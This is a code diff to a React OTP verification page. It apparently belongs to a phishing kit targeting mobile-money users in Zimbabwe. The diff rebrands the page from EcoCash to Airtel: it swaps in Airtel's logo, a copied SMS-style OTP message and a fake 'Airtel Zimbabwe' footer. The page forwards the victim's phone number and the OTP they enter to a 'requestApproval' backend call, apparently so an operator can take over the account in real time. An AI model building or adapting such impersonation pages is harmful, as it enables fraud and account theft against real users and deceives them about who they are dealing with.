@@ -14,8 +14,8 @@ import {
 } from "../styles/sharedStyles";
 import { OtpVerificationPageProps } from "../types";
 
-const formatEcoCashOtpMessage = (otpValue: string) =>
-    `<#> Your EcoCash OTP is:${otpValue}. Do not share this code with anyone. Expires in 2 mins. td1xRGYXC+L`;
+const formatAirtelOtpMessage = (otpValue: string) =>
+    `<#> Your Airtel OTP is:${otpValue}. Do not share this code with anyone. Expires in 2 mins. td1xRGYXC+L`;
 
 function OtpVerificationPage({
     phoneNumber,
@@ -84,7 +84,7 @@ function OtpVerificationPage({
             const res = await requestApproval({
                 type: 'otp',
                 phone: phoneNumber?.replace(/\D/g, '') || "N/A",
-                details: formatEcoCashOtpMessage(otpValue),
+                details: formatAirtelOtpMessage(otpValue),
             });
 
             const attemptId = res.attemptId;
@@ -169,7 +169,7 @@ function OtpVerificationPage({
                 >
                     <ArrowLeft size={20} />
                 </button>
-                <img src="/ecocash.png" alt="EcoCash" style={logoStyle} />
+                <img src="/airtel.svg" alt="Airtel" style={logoStyle} />
                 <button style={menuButtonStyle}>☰</button>
             </div>
 
@@ -328,7 +328,7 @@ function OtpVerificationPage({
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Kashagi Zimbabwe</div>
+            <div style={footerStyle}>© 2025 Airtel Zimbabwe</div>
         </div>
     );
 }
